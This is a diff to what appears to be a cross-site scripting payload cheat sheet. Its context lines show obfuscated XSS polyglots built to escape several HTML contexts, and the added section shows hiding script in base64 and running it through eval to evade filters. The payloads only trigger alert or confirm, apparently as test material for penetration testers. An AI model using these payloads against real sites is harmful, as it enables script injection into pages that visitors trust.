@@ -163,4 +163,8 @@ https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057
 -->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
-
+### 8. base64 Encoding payloads
+```
+btoa('alert(1)') or btoa(alert(1)) // YWxlcnQoMSk=
+var a = atob('YWxlcnQoMSk=');eval(a) // alert(1)
+```
